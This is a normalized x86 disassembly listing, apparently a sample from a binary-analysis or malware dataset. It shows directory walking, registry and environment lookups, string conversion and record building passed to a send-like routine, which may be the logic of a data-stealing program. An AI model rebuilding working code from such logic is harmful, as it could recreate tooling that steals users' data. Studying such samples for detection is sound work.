call sub_405c44
push [ esp + 0x4c ]
call sub_405c44
push [ esp + 0x38 ]
call sub_405c44
push [ esp + 0x44 ]
call sub_405c44
push [ esp + 0x3c ]
call sub_405c44
push [ esp + 0x10 ]
call sub_405c44
lea edx [ eax + 0x5 ]
mov [ esp + 0x58 ] edx
cmp esi ebx
jne r-xdata
inc [ esp + 0x14 ]
mov edx [ esp + 0x58 ]
mov eax [ esp + 0x14 ]
add edx 0xd
mov [ esp + 0x58 ] edx
cmp eax [ esp + 0xa0 ]
jl r-xdata
mov ecx [ edx ]
xor eax eax
add [ esp + 0x10 ] edi
cmp [ rw-data ] ebx
jne r-xdata
mov [ esp + 0x10 ] 0x1
cmp [ edx - 0x1 ] bl
jne r-xdata
cmp [ esp + 0x40 ] ebx
je r-xdata
cmp eax 0x8
jae r-xdata
inc eax
cmp eax 0x8
jb r-xdata
push ebx
call [ SetLastError@IAT ]
push [ esp + 0x10 ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
jne r-xdata
call sub_405c10
cmp al bl
je r-xdata
cmp [ esp + 0x38 ] ebx
je r-xdata
cmp [ esp + 0x4c ] ebx
je r-xdata
mov ecx [ edx + 0x4 ]
mov edx [ esp + 0xa4 ]
lea ecx [ ecx + edx + 0x8 ]
mov [ esp + 0x54 ] ecx
mov [ esp + 0xa8 ] bl
cmp [ eax * 8 + r--data ] bl
je r-xdata
cmp ecx [ eax * 8 + r--data ]
je r-xdata
mov [ esp + 0x10 ] eax
jmp r-xdata
push ebx
call [ ExitProcess@IAT ]
cmp [ esp + 0x3c ] ebx
je r-xdata
cmp [ esp + 0x48 ] ebx
jne r-xdata
push [ esp + 0x54 ]
call [ lstrlenA@IAT ]
lea esi [ eax + eax ]
mov [ esp + 0x98 ] eax
mov [ esp + 0xc ] esi
cmp esi 0x6400000
ja r-xdata
lea eax [ esp + 0xa8 ]
push eax
push ecx
call sub_4102fe
pop ecx
pop ecx
test al al
je r-xdata
push esi
push [ esp + 0x14 ]
push [ esp + 0x1c ]
call sub_404842
push [ esp + 0x14 ]
call [ CloseHandle@IAT ]
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
mov edx ecx
imul edx edx 0xd
lea edx [ edx + eax + 0x4 ]
mov [ esp + 0xa0 ] ecx
mov [ esp + 0xa4 ] edx
mov [ esp + 0x40 ] ebx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x50 ] ebx
mov [ esp + 0x4c ] ebx
mov [ esp + 0x38 ] ebx
mov [ esp + 0x44 ] ebx
mov [ esp + 0x3c ] ebx
mov [ esp + 0x14 ] ebx
cmp ecx ebx
jle r-xdata
cmp [ esp + 0x44 ] ebx
je r-xdata
lea esi [ esp + 0x28 ]
call sub_405d11
mov [ esp + 0x4b4 ] ebx
push ebx
lea eax [ esp + 0x68 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x6c ] 0x77010101
call sub_4060be
push r--data
mov eax esi
push eax
call sub_4025f0
push [ esp + 0x4c ]
mov eax esi
push eax
call sub_4025f0
push r--data
mov eax esi
push eax
call sub_4025f0
push [ esp + 0x40 ]
mov eax esi
push eax
call sub_4025f0
push [ esp + 0x48 ]
mov eax esi
push eax
call sub_4025f0
push ebx
lea eax [ esp + 0x60 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x64 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x70 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x74 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x90 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x94 ] ebx
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0x74 ] eax
push ebx
lea eax [ esp + 0x78 ]
push eax
mov eax edi
mov ecx esi
call sub_4060be
push ebx
lea eax [ esp + 0xa0 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0xa4 ] 0x3
call sub_4060be
push ebx
lea eax [ esp + 0x80 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x84 ] ebx
call sub_4060be
push [ esp + 0x50 ]
mov eax esi
push eax
call sub_4025f0
mov eax [ esp + 0x2c ]
mov [ esp + 0x94 ] eax
lea eax [ esp + 0x94 ]
push eax
mov eax esi
call sub_406173
push [ esp + 0x2c ]
mov esi [ ebp + 0x8 ]
push ebx
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x40 ]
push [ esp + 0x40 ]
call sub_40242d
or [ esp + 0x4b4 ] 0xffffffff
lea esi [ esp + 0x28 ]
call sub_405f2c
cmp [ esp + 0x50 ] ebx
je r-xdata
mov [ esp + 0xc ] ebx
cmp esi ebx
jne r-xdata
lea eax [ esp + 0xa8 ]
mov [ esp + 0x54 ] eax
lea esi [ esp + 0x18 ]
call sub_405d11
mov [ esp + 0x4b4 ] 0x1
push ebx
lea eax [ esp + 0x88 ]
push eax
mov eax edi
mov ecx esi
mov [ esp + 0x8c ] 0x77010101
call sub_4060be
push r--data
mov eax esi
push eax
call sub_4025f0
push [ esp + 0x3c ]
mov eax esi
push eax
call sub_4025f0
mov esi r--data
push esi
lea eax [ esp + 0x1c ]
push eax
call sub_4025f0
push [ esp + 0x38 ]
lea eax [ esp + 0x1c ]
push eax
call sub_4025f0
push [ esp + 0x44 ]
lea eax [ esp + 0x1c ]
push eax
call sub_4025f0
push ebx
lea eax [ esp + 0x64 ]
push eax
mov eax edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x68 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x6c ]
push eax
mov eax edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x70 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x74 ]
push eax
mov eax edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x78 ] ebx
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0x78 ] eax
push ebx
lea eax [ esp + 0x7c ]
push eax
mov eax edi
lea ecx [ esp + 0x20 ]
call sub_4060be
push ebx
lea eax [ esp + 0x84 ]
push eax
mov eax edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x88 ] 0x3
call sub_4060be
push ebx
lea eax [ esp + 0x8c ]
push eax
mov eax edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x90 ] ebx
call sub_4060be
push esi
lea eax [ esp + 0x1c ]
push eax
call sub_4025f0
mov eax [ esp + 0x1c ]
mov [ esp + 0x90 ] eax
lea eax [ esp + 0x90 ]
push eax
lea eax [ esp + 0x1c ]
call sub_406173
push [ esp + 0x1c ]
mov esi [ ebp + 0x8 ]
push ebx
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x30 ]
push [ esp + 0x30 ]
call sub_40242d
or [ esp + 0x4b4 ] 0xffffffff
lea esi [ esp + 0x18 ]
call sub_405f2c
mov eax [ esp + 0xc ]
mov ecx esi
cmp esi ebx
je r-xdata
add [ esp + 0xc ] edi
cmp [ rw-data ] ebx
jne r-xdata
mov [ esp + 0xc ] 0x1
push esi
push [ esp + 0x10 ]
push [ esp + 0xa0 ]
push [ esp + 0x60 ]
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push ebx
call [ SetLastError@IAT ]
push [ esp + 0xc ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
cmp eax ebx
je r-xdata
call sub_405c10
cmp al bl
je r-xdata
mov eax [ esp + 0x58 ]
mov eax [ eax ]
sub eax 0x8179
je r-xdata
mov [ esp + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x3c ] eax
sub eax 0x1b
je r-xdata
cmp [ esp + 0xc ] ebx
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x50 ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x40 ] eax
jmp r-xdata
sub eax 0x9
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x4c ] eax
jmp r-xdata
sub eax 0x8
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x44 ] eax
jmp r-xdata
dec eax
je r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x38 ] eax
jmp r-xdata
sub eax 0x16
jne r-xdata
mov eax [ esp + 0xc ]
mov [ esp + 0x48 ] eax
jmp r-xdata
sub_410b21
push ebp
mov ebp esp
sub esp 0x208
push ebx
push esi
xor eax eax
push 0x206
push eax
mov [ ebp - 0x208 ] ax
lea eax [ ebp - 0x206 ]
push eax
call sub_4130d0
add esp 0xc
push [ ebp + 0xc ]
lea eax [ ebp - 0x208 ]
push eax
call [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ ebp - 0x208 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x208 ]
push eax
call esi
lea eax [ ebp - 0x208 ]
push eax
call sub_4048a5
test al al
je r-xdata
pop esi
mov al 0x1
pop ebx
leave
retn
lea eax [ ebp - 0x208 ]
push eax
call [ lstrlenW@IAT ]
push eax
lea eax [ ebp - 0x208 ]
push eax
call sub_401806
mov ebx eax
mov eax rw-data
call sub_401872
test al al
je r-xdata
lea eax [ ebp - 0x208 ]
push eax
push [ ebp + 0x8 ]
call sub_410522
pop ecx
pop ecx
sub_410bdd
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x660
push esi
push edi
xor eax eax
push 0x206
push eax
mov [ esp + 0x10 ] ax
lea eax [ esp + 0x12 ]
push eax
call sub_4130d0
mov edi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0xc ]
push eax
call edi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0xc ]
push eax
call esi
mov eax [ ebp + 0x10 ]
add eax 0x2c
push eax
lea eax [ esp + 0xc ]
push eax
call esi
push r--data
lea eax [ esp + 0xc ]
push eax
call esi
lea eax [ esp + 0x8 ]
test eax eax
je r-xdata
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
xor eax eax
cmp eax sub_410b21
je r-xdata
lea eax [ esp + 0x8 ]
push eax
lea eax [ esp + 0x464 ]
push eax
call edi
lea eax [ esp + 0x8 ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x210 ]
push eax
lea eax [ esp + 0x464 ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
test al 0x10
je r-xdata
mov esi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x464 ]
push eax
call esi
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x240 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x210 ] 0x10
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x210 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x240 ]
push eax
call esi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x214 ]
push eax
lea eax [ esp + 0x10 ]
push eax
push [ ebp + 0x8 ]
call sub_410b21
add esp 0x10
test al al
je r-xdata
sub_410d27
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x464
push ebx
push esi
push edi
mov esi rw-data
call sub_406c79
test al al
je r-xdata
mov esi [ ebp + 0x8 ]
call sub_4066e2
mov [ esp + 0x10 ] r--data
cmp eax 0x3
jl r-xdata
mov eax rw-data
mov ebx esi
call sub_406f26
mov edi esi
call sub_406db6
mov esi [ GetEnvironmentVariableW@IAT ]
xor edi edi
inc edi
push edi
lea eax [ esp + 0x18 ]
push eax
push [ esp + 0x18 ]
mov [ esp + 0x20 ] edi
call esi
mov ebx eax
test ebx ebx
jne r-xdata
mov [ esp + 0x10 ] r--data
lea eax [ ebx + ebx + 0x2 ]
mov [ esp + 0xc ] eax
cmp eax 0x6400000
ja r-xdata
xor al al
jmp r-xdata
xor edi edi
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc ebx
push ebx
push edi
push [ esp + 0x18 ]
call esi
test eax eax
jne r-xdata
add [ esp + 0xc ] 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esp + 0xc ] edi
lea ecx [ edi + eax * 2 - 0x2 ]
jmp r-xdata
push edi
call sub_405c44
jmp r-xdata
push 0x0
call [ SetLastError@IAT ]
push [ esp + 0xc ]
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
jne r-xdata
call sub_405c10
test al al
je r-xdata
cmp [ ecx ] 0x5c
jne r-xdata
mov edi eax
jmp r-xdata
push eax
call [ ExitProcess@IAT ]
sub ecx 0x2
dec eax
je r-xdata
xor ecx ecx
mov [ edi + eax * 2 - 0x2 ] cx
xor eax eax
cmp eax sub_410bdd
je r-xdata
test edi edi
je r-xdata
push edi
call sub_405c44
mov esi rw-data
call sub_406c79
test al al
je r-xdata
push edi
lea eax [ esp + 0x26c ]
push eax
call [ lstrcpyW@IAT ]
push edi
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
mov al 0x1
mov edx rw-data
mov ecx esi
call sub_406e3e
mov edi esi
call sub_406db6
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x26c ]
push eax
call [ FindFirstFileW@IAT ]
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
test al 0x10
je r-xdata
mov esi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x26c ]
push eax
call [ lstrcatW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x48 ]
push eax
call esi
test eax eax
je r-xdata
test [ esp + 0x18 ] 0x10
je r-xdata
push ebx
call [ FindClose@IAT ]
lea eax [ esp + 0x18 ]
push eax
push ebx
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x48 ]
push eax
call esi
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x1c ]
push eax
push edi
push [ ebp + 0x8 ]
call sub_410bdd
add esp 0x10
test al al
je r-xdata
sub_410f11
push ebp
mov ebp esp
mov eax 0x28b4
call sub_419050
push ebx
push edi
push [ ebp + 0x8 ]
call [ SetCurrentDirectoryW@IAT ]
push [ ebp + 0x8 ]
mov edi [ lstrcpyW@IAT ]
lea eax [ ebp - 0x1464 ]
push eax
call edi
push r--data
lea eax [ ebp - 0x1464 ]
push eax
call [ PathAppendW@IAT ]
push r--data
call sub_4046cc
lea ebx [ ebp - 0x1464 ]
mov ecx eax
call sub_4010c5
push r--data
mov [ esi ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ esi + 0x4 ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ esi + 0x8 ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ esi + 0xc ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ esi + 0x10 ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ esi + 0x14 ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ esi + 0x18 ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
xor ecx ecx
mov [ esi + 0x1c ] eax
cmp [ esi ] ecx
je r-xdata
xor al al
cmp [ esi + 0x4 ] ecx
je r-xdata
cmp [ esi + 0x8 ] ecx
je r-xdata
cmp [ esi + 0xc ] ecx
je r-xdata
cmp [ esi + 0x10 ] ecx
je r-xdata
cmp [ esi + 0x14 ] ecx
je r-xdata
cmp [ esi + 0x18 ] ecx
je r-xdata
cmp eax ecx
je r-xdata
mov [ ebp - 0x10 ] r--data
mov [ ebp - 0xc ] r--data
mov [ ebp - 0x8 ] ecx
inc [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x2
jb r-xdata
cmp [ esi + 0x24 ] ecx
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x28b4 ]
push eax
call edi
mov eax [ ebp - 0x8 ]
push [ ebp + eax * 4 - 0x10 ]
lea eax [ ebp - 0x28b4 ]
push eax
call [ PathAppendW@IAT ]
push r--data
call sub_4046cc
lea ebx [ ebp - 0x28b4 ]
mov ecx eax
call sub_4010c5
push r--data
mov [ esi + 0x20 ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ esi + 0x24 ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
push r--data
mov [ esi + 0x28 ] eax
call sub_4046cc
mov ecx eax
call sub_4010c5
xor ecx ecx
mov [ esi + 0x2c ] eax
cmp [ esi + 0x20 ] ecx
je r-xdata
cmp [ esi + 0x28 ] ecx
je r-xdata
cmp eax ecx
jne r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop ebx
leave
retn 0x4
sub_4110ef
push ebp
mov ebp esp
mov eax 0x145c
call sub_419050
push ebx
push esi
push edi
push r--data
lea eax [ ebp - 0x1458 ]
push eax
mov esi ecx
call [ lstrcpyW@IAT ]
xor ecx ecx
mov eax r--data
mov ebx 0x80000002
cmp ecx eax
je r-xdata
push r--data
lea eax [ ebp - 0x1458 ]
push eax
call [ lstrcpyW@IAT ]
xor ecx ecx
mov eax r--data
cmp ecx eax
je r-xdata
lea ecx [ ebp - 0x1458 ]
push ecx
push r--data
push eax
push ebx
lea edi [ ebp - 0x4 ]
call sub_4068cf
test al al
je r-xdata
xor al al
lea ecx [ ebp - 0x1458 ]
push ecx
push r--data
push eax
push ebx
lea edi [ ebp - 0x4 ]
call sub_4068cf
test al al
je r-xdata
lea eax [ ebp - 0x1458 ]
push eax
call sub_410f11
test al al
je r-xdata
lea eax [ ebp - 0x1458 ]
push eax
call sub_410f11
test al al
jne r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_41119f
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
mov esi [ eax ]
push 0xc
pop ecx
lea eax [ ebp - 0x1c ]
xor ebx ebx
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push 0xc
pop ecx
lea eax [ ebp - 0x10 ]
mov [ eax ] bl
inc eax
dec ecx
jne r-xdata
push r--data
push edi
call [ lstrcpyW@IAT ]
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push ebx
call [ esi + 0x18 ]
add esp 0x10
test eax eax
jne r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ esi + 0x14 ]
add esp 0xc
test eax eax
je r-xdata
xor al al
cmp [ ebp - 0x8 ] 0x800
jb r-xdata
lea eax [ ebp - 0x1c ]
push ebx
push eax
call [ esi + 0x1c ]
pop ecx
pop ecx
jmp r-xdata
push 0x7ff
push edi
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push ebx
push 0xfde9
call [ MultiByteToWideChar@IAT ]
xor ecx ecx
mov [ edi + eax * 2 ] cx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov [ ebp - 0x1 ] bl
lea eax [ ebp - 0x1c ]
push ebx
push eax
call [ esi + 0x1c ]
lea eax [ ebp - 0x10 ]
push ebx
push eax
call [ esi + 0x1c ]
mov al [ ebp - 0x1 ]
add esp 0x10
jmp r-xdata
pop esi
pop ebx
leave
retn
sub_411258
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41dc3d
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x3034
call sub_419050
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push ebx
mov [ esp + 0x20 ] eax
push esi
xor eax eax
cmp [ ebp + 0xc ] 0x6
push edi
jl r-xdata
mov ecx [ esp + 0x3044 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
mov edi 0xffe
push edi
mov [ esp + 0x44 ] ax
xor ebx ebx
lea eax [ esp + 0x46 ]
push ebx
push eax
call sub_4130d0
xor eax eax
push edi
mov [ esp + 0x1050 ] ax
lea eax [ esp + 0x1052 ]
push ebx
push eax
call sub_4130d0
xor eax eax
push edi
mov [ esp + 0x205c ] ax
lea eax [ esp + 0x205e ]
push ebx
push eax
call sub_4130d0
mov esi [ ebp + 0x10 ]
add esp 0x24
push 0x7ff
lea eax [ esp + 0x44 ]
push eax
push [ esi + 0x4 ]
call [ lstrlenA@IAT ]
push eax
push [ esi + 0x4 ]
push ebx
push 0xfde9
call [ MultiByteToWideChar@IAT ]
push [ esi + 0x10 ]
xor ecx ecx
mov [ esp + eax * 2 + 0x44 ] cx
mov eax [ ebp + 0x8 ]
lea edi [ esp + 0x1044 ]
call sub_41119f
pop ecx
test al al
je r-xdata
xor eax eax
push [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
lea edi [ esp + 0x2044 ]
call sub_41119f
pop ecx
test al al
je r-xdata
lea esi [ esp + 0xc ]
call sub_405d11
mov [ esp + 0x304c ] ebx
push ebx
lea eax [ esp + 0x38 ]
push eax
push 0x4
pop edi
mov eax edi
mov ecx esi
mov [ esp + 0x3c ] 0x77010101
call sub_4060be
push r--data
mov eax esi
push eax
call sub_4025f0
lea eax [ esp + 0x40 ]
push eax
mov eax esi
push eax
call sub_4025f0
mov esi r--data
push esi
lea eax [ esp + 0x10 ]
push eax
call sub_4025f0
lea eax [ esp + 0x1040 ]
push eax
lea eax [ esp + 0x10 ]
push eax
call sub_4025f0
lea eax [ esp + 0x2040 ]
push eax
lea eax [ esp + 0x10 ]
push eax
call sub_4025f0
push ebx
lea eax [ esp + 0x34 ]
push eax
mov eax edi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x38 ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x28 ]
push eax
mov eax edi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2c ] ebx
call sub_4060be
push ebx
lea eax [ esp + 0x40 ]
push eax
mov eax edi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x44 ] ebx
call sub_4060be
call [ GetACP@IAT ]
mov [ esp + 0x2c ] eax
push ebx
lea eax [ esp + 0x30 ]
push eax
mov eax edi
lea ecx [ esp + 0x14 ]
call sub_4060be
push ebx
lea eax [ esp + 0x3c ]
push eax
mov eax edi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x40 ] 0x3
call sub_4060be
push ebx
lea eax [ esp + 0x20 ]
push eax
mov eax edi
lea ecx [ esp + 0x14 ]
mov [ esp + 0x24 ] ebx
call sub_4060be
push esi
lea eax [ esp + 0x10 ]
push eax
call sub_4025f0
mov eax [ esp + 0x10 ]
mov [ esp + 0x20 ] eax
lea eax [ esp + 0x20 ]
push eax
lea eax [ esp + 0x10 ]
call sub_406173
push [ esp + 0x10 ]
mov esi [ esp + 0x2c ]
push ebx
push 0x64
push esi
call sub_403aef
push eax
push 0xff0f8211
push [ esp + 0x24 ]
push [ esp + 0x24 ]
call sub_40242d
test al al
je r-xdata
or [ esp + 0x304c ] 0xffffffff
lea esi [ esp + 0xc ]
call sub_405f2c
jmp r-xdata
or [ esp + 0x304c ] 0xffffffff
lea esi [ esp + 0xc ]
call sub_405f2c
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x1
sub_4114d2
push ebp
mov ebp esp
push ecx
push ecx
push ebx
call [ esi + 0x8 ]
mov ebx eax
test ebx ebx
je r-xdata
call [ esi + 0x4 ]
mov al 0x1
pop ebx
leave
retn
push 0x0
push 0x1
push ebx
call [ esi + 0x10 ]
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push r--data
call [ esi + 0x20 ]
add esp 0x14
test eax eax
jne r-xdata
push ebx
call [ esi + 0xc ]
pop ecx
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
push sub_411258
push r--data
push [ ebp - 0x8 ]
call [ esi + 0x28 ]
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push [ ebp - 0x8 ]
call [ esi + 0x24 ]
pop ecx
push [ ebp - 0x4 ]
call [ esi + 0x2c ]
pop ecx
sub_41153f
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x2af4
call sub_419050
push ebx
push esi
push edi
xor eax eax
mov esi 0x144e
push esi
push eax
mov [ esp + 0x268 ] ax
lea eax [ esp + 0x26a ]
push eax
call sub_4130d0
add esp 0xc
xor eax eax
push esi
push eax
mov [ esp + 0x16b8 ] ax
lea eax [ esp + 0x16ba ]
push eax
call sub_4130d0
mov edi [ ebp + 0x14 ]
mov eax [ edi + 0x4 ]
mov esi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
mov [ esp + 0x10 ] eax
lea eax [ esp + 0x264 ]
push eax
call esi
mov eax [ ebp + 0x10 ]
mov ebx [ PathAppendW@IAT ]
add eax 0x2c
push eax
lea eax [ esp + 0x264 ]
push eax
call ebx
lea eax [ esp + 0x260 ]
push eax
lea eax [ esp + 0x16b4 ]
push eax
call esi
push r--data
lea eax [ esp + 0x16b4 ]
push eax
call ebx
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x16b4 ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x260 ]
push 0x0
push eax
lea eax [ esp + 0x18 ]
call sub_407e71
mov esi [ esp + 0x14 ]
pop ecx
pop ecx
mov ebx eax
call sub_409545
test al al
je r-xdata
mov esi [ edi ]
lea eax [ esp + 0x260 ]
push eax
mov [ edi + 0xc ] 0x0
call [ SetCurrentDirectoryW@IAT ]
push r--data
call [ esi ]
pop ecx
test eax eax
jne r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
push edi
call sub_4114d2
pop ecx
mov eax [ esp + 0xc ]
call sub_401872
sub_41165f
push ebp
mov ebp esp
and esp 0xfffffff8
mov eax 0x18ac
call sub_419050
push ebx
push esi
push edi
xor eax eax
push 0x144e
push eax
mov [ esp + 0x470 ] ax
lea eax [ esp + 0x472 ]
push eax
call sub_4130d0
mov edi [ lstrcpyW@IAT ]
add esp 0xc
push [ ebp + 0xc ]
lea eax [ esp + 0x46c ]
push eax
call edi
mov ebx [ ebp + 0x10 ]
mov esi [ PathAppendW@IAT ]
add ebx 0x2c
push ebx
lea eax [ esp + 0x46c ]
push eax
call esi
push r--data
lea eax [ esp + 0x46c ]
push eax
call esi
lea eax [ esp + 0x468 ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
lea eax [ esp + 0x46c ]
push eax
call edi
push ebx
lea eax [ esp + 0x46c ]
push eax
call esi
push r--data
lea eax [ esp + 0x46c ]
push eax
call esi
lea eax [ esp + 0x468 ]
test eax eax
je r-xdata
xor eax eax
cmp eax sub_41153f
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
cmp eax sub_41153f
je r-xdata
lea eax [ esp + 0x468 ]
push eax
lea eax [ esp + 0x264 ]
push eax
call edi
lea eax [ esp + 0x468 ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x468 ]
push eax
lea eax [ esp + 0x264 ]
push eax
call edi
lea eax [ esp + 0x468 ]
push eax
call [ GetFileAttributesW@IAT ]
cmp eax 0xffffffff
je r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x264 ]
push eax
call [ FindFirstFileW@IAT ]
mov [ esp + 0xc ] eax
cmp eax 0xffffffff
je r-xdata
test al 0x10
je r-xdata
lea eax [ esp + 0x10 ]
push eax
lea eax [ esp + 0x264 ]
push eax
call [ FindFirstFileW@IAT ]
mov edi eax
cmp edi 0xffffffff
je r-xdata
test al 0x10
je r-xdata
test [ esp + 0x10 ] 0x10
je r-xdata
push r--data
lea eax [ esp + 0x264 ]
push eax
call [ lstrcatW@IAT ]
test [ esp + 0x10 ] 0x10
je r-xdata
push r--data
lea eax [ esp + 0x264 ]
push eax
call [ lstrcatW@IAT ]
push 0x0
call [ Sleep@IAT ]
push r--data
lea eax [ esp + 0x40 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push 0x0
call [ Sleep@IAT ]
mov esi [ lstrcmpW@IAT ]
push r--data
lea eax [ esp + 0x40 ]
push eax
call esi
test eax eax
je r-xdata
push [ esp + 0xc ]
call [ FindClose@IAT ]
lea eax [ esp + 0x10 ]
push eax
push [ esp + 0x10 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x40 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push edi
call [ FindClose@IAT ]
lea eax [ esp + 0x10 ]
push eax
push edi
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x40 ]
push eax
call esi
test eax eax
je r-xdata
push [ ebp + 0x14 ]
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x470 ]
push eax
push [ ebp + 0x8 ]
call sub_41153f
add esp 0x10
test al al
je r-xdata
push [ ebp + 0x14 ]
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x470 ]
push eax
push [ ebp + 0x8 ]
call sub_41153f
add esp 0x10
test al al
je r-xdata
sub_4118bf
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_41ddbe
mov eax [ fs : 0x0 ]
push eax
